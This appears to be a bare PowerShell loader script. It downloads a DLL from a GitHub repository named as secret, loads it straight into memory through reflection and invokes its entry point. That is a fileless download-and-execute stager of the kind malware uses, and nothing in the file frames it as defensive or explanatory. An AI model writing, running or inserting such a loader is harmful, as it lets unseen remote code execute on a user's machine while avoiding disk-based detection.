$dllUrl = "https://github.com/imreallyemo1337/KUTTHROATVONSECRETGITHUBREPO/raw/main/chxpo.dll"

# Download the DLL to a byte array
$fileData = (New-Object System.Net.WebClient).DownloadData($dllUrl)

# Load the assembly into memory
$assembly = [System.Reflection.Assembly]::Load($fileData)

# Get the main entry point (i.e., main method) of the assembly
$entryPoint = $assembly.EntryPoint

# Invoke the main method
if ($entryPoint -ne $null) {
    $entryPoint.Invoke($null, @())
}

